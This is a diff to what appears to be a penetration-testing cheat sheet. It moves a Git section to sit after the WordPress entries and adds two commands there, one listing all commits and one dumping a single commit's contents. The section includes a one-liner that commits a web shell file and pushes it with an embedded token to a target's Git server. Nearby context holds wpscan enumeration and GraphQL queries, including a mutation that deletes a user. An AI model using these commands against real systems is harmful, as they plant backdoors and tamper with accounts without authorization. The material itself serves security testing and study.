@@ -165,6 +165,11 @@ unzip backup.zip -d .
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
+[*] Git
+git rev-list --all
+git cat-file -p acb753dd975a639f2dbc28ee8fd4d67adc50e609
+git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
+
 [*] Zabbix
 +---------- Login Get Auth Key ----------+
 curl \
@@ -400,9 +405,6 @@ https://datafetcher.com/graphql-json-body-converter
 {  "query": "query { getUser(id: 3) { id username }}"  }
 
 {  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }
-
-[*] Git
-git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
 [*] Active Directory
